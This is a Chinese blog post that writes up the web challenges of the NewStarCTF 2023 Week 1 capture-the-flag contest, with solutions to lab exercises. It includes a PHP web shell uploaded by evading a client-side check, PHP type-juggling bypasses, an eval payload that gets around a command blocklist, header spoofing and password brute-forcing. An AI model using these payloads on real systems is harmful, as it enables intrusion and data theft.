

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" href="/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="lazy_forever">
  <meta name="keywords" content="">
  
    <meta name="description" content="好久没碰ctf了，感觉手有点生，正好最近newstar新生赛，过来凑个热闹。 Web解题 7&#x2F;7 泄漏的秘密介绍里面写了“粗心的网站管理员总会泄漏一些敏感信息在Web根目录下”，一眼信息泄露 打开容器，出现粗心的管理员泄漏了一些敏感信息，请你找出他泄漏的两个敏感信息！，&#x2F;robots.txt一试直接爆出flag的前半段，&#x2F;www.zip直接把源码泄露了。 拿到flag">
<meta property="og:type" content="article">
<meta property="og:title" content="NewStarCTF 2023-WEEK1 WriteUp">
<meta property="og:url" content="https://blog.lazyforever.top/2023/09/26/2023newstarctfWeek1/index.html">
<meta property="og:site_name" content="lazy_forever&#39;s Blog">
<meta property="og:description" content="好久没碰ctf了，感觉手有点生，正好最近newstar新生赛，过来凑个热闹。 Web解题 7&#x2F;7 泄漏的秘密介绍里面写了“粗心的网站管理员总会泄漏一些敏感信息在Web根目录下”，一眼信息泄露 打开容器，出现粗心的管理员泄漏了一些敏感信息，请你找出他泄漏的两个敏感信息！，&#x2F;robots.txt一试直接爆出flag的前半段，&#x2F;www.zip直接把源码泄露了。 拿到flag">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://blog.lazyforever.top/2023/09/26/2023newstarctfWeek1/burp.png">
<meta property="og:image" content="https://blog.lazyforever.top/2023/09/26/2023newstarctfWeek1/re1_up.png">
<meta property="og:image" content="https://blog.lazyforever.top/2023/09/26/2023newstarctfWeek1/re2.png">
<meta property="og:image" content="https://blog.lazyforever.top/2023/09/26/2023newstarctfWeek1/apkre.png">
<meta property="article:published_time" content="2023-09-26T05:33:13.000Z">
<meta property="article:modified_time" content="2023-10-02T06:32:39.687Z">
<meta property="article:author" content="lazy_forever">
<meta property="article:tag" content="web">
<meta property="article:tag" content="reverse">
<meta property="article:tag" content="misc">
<meta property="article:tag" content="pwn">
<meta property="article:tag" content="crypto">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://blog.lazyforever.top/2023/09/26/2023newstarctfWeek1/burp.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>NewStarCTF 2023-WEEK1 WriteUp - lazy_forever&#39;s Blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"blog.lazyforever.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"84176b1e334c7f1956cee269aaaf9bb3","google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  
    <!-- Baidu Analytics -->
    <script async>
      if (!Fluid.ctx.dnt) {
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?84176b1e334c7f1956cee269aaaf9bb3";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
      }
    </script>
  

  
    <!-- Google tag (gtag.js) -->
    <script async>
      if (!Fluid.ctx.dnt) {
        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
          window.dataLayer = window.dataLayer || [];
          function gtag() {
            dataLayer.push(arguments);
          }
          gtag('js', new Date());
          gtag('config', '');
        });
      }
    </script>
  

  

  

  

  



  
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="lazy_forever's Blog" type="application/atom+xml">
</head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>lazy_forever</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="NewStarCTF 2023-WEEK1 WriteUp"></span>
          
        </div>

        
          
  <div class="mt-3">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-author" aria-hidden="true"></i>
        lazy_forever
      </span>
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-09-26 13:33" pubdate>
          2023年9月26日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          37k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          313 分钟
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">NewStarCTF 2023-WEEK1 WriteUp</h1>
            
              <p class="note note-info">
                
                  
                    本文最后更新于：2 个月前
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <p>好久没碰ctf了，感觉手有点生，正好最近newstar新生赛，过来凑个热闹。</p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>解题 7&#x2F;7</p>
<h3 id="泄漏的秘密"><a href="#泄漏的秘密" class="headerlink" title="泄漏的秘密"></a>泄漏的秘密</h3><p>介绍里面写了“粗心的网站管理员总会泄漏一些敏感信息在Web根目录下”，一眼信息泄露</p>
<p>打开容器，出现<code>粗心的管理员泄漏了一些敏感信息，请你找出他泄漏的两个敏感信息！</code>，&#x2F;robots.txt一试直接爆出flag的前半段，&#x2F;<a target="_blank" rel="noopener" href="http://www.zip直接把源码泄露了./">www.zip直接把源码泄露了。</a></p>
<p>拿到flag：<code>flag&#123;r0bots_1s_s0_us3ful_4nd_www.zip_1s_s0_d4ng3rous&#125;</code></p>
<h3 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h3><p>一眼文件上传，写一个php马试一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br></code></pre></td></tr></table></figure>

<p>发现文件后缀有白名单，但是验证是在前端，直接burp抓包改一下文件名就能绕</p>
<h3 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h3><p>打开容器，发现要求请使用 GET方式 来给 ctf 参数传入任意值来通过这关</p>
<p>加个参数试一下<code>http://node4.buuoj.cn:25055/?ctf=1</code></p>
<p>发现<code>很棒，如果我还想让你以POST方式来给我传递 secret 参数你又该如何处理呢？ 如果你传入的参数值并不是我想要的secret，我也不会放你过关的 或许你可以找一找我把secret藏在了哪里</code></p>
<p>ctrl+U看下源码，发现注释<code>&lt;!-- Secret: base64_decode(bjN3c3Q0ckNURjIwMjNnMDAwMDBk) --&gt;</code></p>
<p>base64解码一下，得到secret是n3wst4rCTF2023g00000d</p>
<p>HackBar插件传一下POST参数</p>
<p>接下来发现<code>很强，现在我需要验证你的 power 是否是 ctfer ，只有ctfer可以通过这关</code></p>
<p>Cookie改一下power改为ctfer</p>
<p>发现<code>你已经完成了本题过半的关卡，现在请使用 NewStarCTF2023浏览器 来通过这关！</code></p>
<p>把User-Agent改为NewStarCTF2023</p>
<p>发现<code>希望你是从 newstarctf.com 访问到这个关卡的</code></p>
<p>加个Referer: <code>newstarctf.com</code> </p>
<p>最后发现<code>最后一关了！只有 本地用户 可以通过这一关</code></p>
<p>加一个Header：<code>X-Real-IP: 127.0.0.1</code>，本来以为这道题是要加X-Forwarded-For，结果加X-Forwarded-For发现好像不太行</p>
<p>拿到flag：<code>flag&#123;221fb558-9c0a-4b07-bac6-3af03cf7393e&#125;</code></p>
<h3 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h3><p>这道题有点奇怪，看到flask以为是SSTI，结果打开容器随便传个<code>number1=&#123;&#123;&#125;&#125;</code>，发现DEBUG模式没关，结果flag直接写到源代码里直接能看见，直接拿到flag：<code>flag&#123;Y0u_@re_3enset1ve_4bout_deb8g&#125;</code></p>
<h3 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h3><p>上来容器直接给出代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 1=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>] !== <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$flag1</span> = True;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 1&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag1</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 2=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$flag2</span> = True;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 2&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag2</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 3=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>],<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>)) == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-variable">$flag3</span> = True;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 3&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag3</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 4=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>] &gt; <span class="hljs-number">2023</span>)&#123;<br>            <span class="hljs-variable">$flag4</span> = True;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 4&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag4</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 5=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$var</span>)&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="hljs-variable">$var</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag5</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>先看level1，要保证<code>$_GET[&#39;key1&#39;] !== $_GET[&#39;key2&#39;] &amp;&amp; md5($_GET[&#39;key1&#39;]) == md5($_GET[&#39;key2&#39;])</code>为 True，发现md5直接的判断是&#x3D;&#x3D;而不是&#x3D;&#x3D;&#x3D;，直接0e碰撞即可，随便找两个<code>240610708</code>和<code>QLTHNDT</code>就行。</p>
<p>再看level2，保证<code>md5($_POST[&#39;key3&#39;]) === sha1($_POST[&#39;key3&#39;]</code>为 True，中间是&#x3D;&#x3D;&#x3D;，没办法再用level1的0e碰撞了，这里一个小技巧直接POST传<code>key3[]=</code>即可，这里key3直接被识别成数组了，导致两个函数都返回false。</p>
<p>接下来level3，保证<code>strcmp($_GET[&#39;key4&#39;],file_get_contents(&quot;/flag&quot;)) == 0</code>为 True，继续用<code>key4[]=</code>，用数组的方式让其返回false</p>
<p>然后level4，保证<code>!is_numeric($_GET[&#39;key5&#39;]) &amp;&amp; $_GET[&#39;key5&#39;] &gt; 2023</code>为 True，传<code>key5=2024a</code>，当它与2023比较时就会比它大，而且还识别不出它是数字。</p>
<p>最后level5，要保证它不能全是字母和数字，还要保证flag5变量是True，POST传<code>flag5=-</code>即可。</p>
<p>拿到flag：<code>flag&#123;35c5a11f-c06d-4178-9fb8-b4f97d3e9796&#125;</code></p>
<h3 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h3><p>打开容器，贴上代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$password</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$password</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)===<span class="hljs-string">&quot;c4d038&quot;</span>)&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>要保证password的md5前6位是<code>c4d038</code>，同时code中不能含有一些敏感的单词。</p>
<p>这里贴上我跑MD5的脚本，写的不好，但是勉强能跑</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> threading<br><br><span class="hljs-comment"># 需要遍历的字符集</span><br>characters = string.digits + string.ascii_letters<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_combinations</span>(<span class="hljs-params">length</span>):<br>    <span class="hljs-keyword">for</span> combo <span class="hljs-keyword">in</span> itertools.product(characters, repeat=length):<br>        <span class="hljs-keyword">yield</span> <span class="hljs-string">&#x27;&#x27;</span>.join(combo)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_md5</span>(<span class="hljs-params">string</span>):<br>    md5_hash = hashlib.md5()  <span class="hljs-comment"># 创建MD5对象</span><br>    md5_hash.update(string.encode())  <span class="hljs-comment"># 更新对象哈希值</span><br>    md5_digest = md5_hash.hexdigest()  <span class="hljs-comment"># 获取哈希值的十六进制表示</span><br>    <span class="hljs-keyword">return</span> md5_digest<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_md5_match</span>(<span class="hljs-params">prefix</span>):<br>    <span class="hljs-keyword">for</span> combo <span class="hljs-keyword">in</span> generate_combinations(<span class="hljs-built_in">len</span>(prefix)):<br>        string = prefix + combo<br>        md5 = calculate_md5(string)<br>        <span class="hljs-keyword">if</span> md5[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] == <span class="hljs-string">&#x27;c4d038&#x27;</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;string&#125;</span>   MD5哈希值: <span class="hljs-subst">&#123;md5&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># 测试计算MD5</span><br>input_string = <span class="hljs-string">&quot;0&quot;</span><br><br>threads = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):  <span class="hljs-comment"># 根据实际情况设置线程数量</span><br>    prefix = input_string * i<br>    thread = threading.Thread(target=find_md5_match, args=(prefix,))<br>    threads.append(thread)<br>    thread.start()<br><br><span class="hljs-keyword">for</span> thread <span class="hljs-keyword">in</span> threads:<br>    thread.join()<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;input_string&#125;</span>dddMD5哈希值: <span class="hljs-subst">&#123;md5&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>随便跑出来一个<code>0000006sNj</code></p>
<p>接着直接传</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">e[v.a.l=<span class="hljs-keyword">echo</span> `cat /f*`<br></code></pre></td></tr></table></figure>

<p>这里注意要用[代替_，这算是一个php特性。</p>
<h3 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h3><p>打开容器，看到一个登录注册页面，拿burp抓包，最开始以为是sql注入，但是注入发现提示不是注入。</p>
<p>随便注册一个账号admin1，登录后发现是一个静态的shell，javascript代码审计一下，发现</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot;echo -en &#x27;\\nnewstar\\nnewstar2023&#x27; &gt;&gt; weak-passwd.txt &amp;&amp; \\\nexport PASSWORD=`shuf weak-passwd.txt | head -n 1` &amp;&amp; \\\nrm -rf weak-passwd.txt&quot;</span>),<span class="hljs-title function_">applyAutoComplete</span>(le),<span class="hljs-keyword">await</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-number">800</span>),term.<span class="hljs-title function_">writeln</span>(<span class="hljs-variable constant_">WELCOME_TEXT</span>),<span class="hljs-title function_">readInput</span>(),le.<span class="hljs-title function_">detach</span>(),<span class="hljs-keyword">await</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-number">200</span>),le.<span class="hljs-title function_">attach</span>(),le.<span class="hljs-title function_">pushInput</span>(<span class="hljs-string">&quot;chat&quot;</span>),le.<span class="hljs-title function_">confirm</span>(),<span class="hljs-keyword">await</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-number">200</span>),le.<span class="hljs-title function_">pushInput</span>(<span class="hljs-string">&quot;你会说中文吗？&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>提示weak-passwd.txt弱口令，再加上注册时发现admin用户已经被注册，使用burp直接爆破密码。</p>
<img src="/2023/09/26/2023newstarctfWeek1/burp.png" srcset="/img/loading.gif" lazyload class="">

<p>发现admin弱口令是000000</p>
<p>登录，并拦截返回包，javascript审计，发现提示</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot;echo Maybe you need BurpSuite.&quot;</span><br></code></pre></td></tr></table></figure>

<p>清除cookie重新登录，拦截passport的返回包，得到flag：<code>flag&#123;97222ac1-f6d3-49c1-b1e6-05778420cfe2&#125;</code></p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>解题 5&#x2F;6</p>
